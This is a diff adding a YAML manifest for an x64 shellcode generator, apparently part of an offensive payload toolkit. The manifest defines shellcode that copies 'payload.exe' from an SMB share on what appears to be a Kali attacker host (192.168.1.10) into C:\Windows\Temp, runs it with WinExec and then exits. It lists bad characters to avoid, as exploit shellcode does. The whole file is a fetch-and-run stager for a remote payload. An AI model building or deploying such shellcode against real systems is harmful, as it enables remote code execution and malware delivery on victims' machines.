@@ -1,0 +1,26 @@
+# Move then run (MoveFileA + WinExec) - x64
+# IR workflow: MoveFileA + WinExec with exit strategy.
+#
+# Build:
+#   uv run emitrion-x64 emitrion/manifests/x64/move_then_run_x64.yaml \
+#       --src "\\\\192.168.1.10\\kalismb\\payload.exe" \
+#       --dst "C:\Windows\Temp\payload.exe" \
+#       --out emitter_out/
+arch: x64
+template: ir_move_then_run
+badchars: ["00", "0A", "0D"]
+
+functions:
+  - MoveFileA
+  - WinExec
+  - ExitProcess
+
+strings:
+  - label: src_path
+    value: "\\\\192.168.1.10\\kalismb\\payload.exe"
+    method: mov
+    dest: rdi
+  - label: dst_path
+    value: "C:\\Windows\\Temp\\payload.exe"
+    method: mov
+    dest: rdi
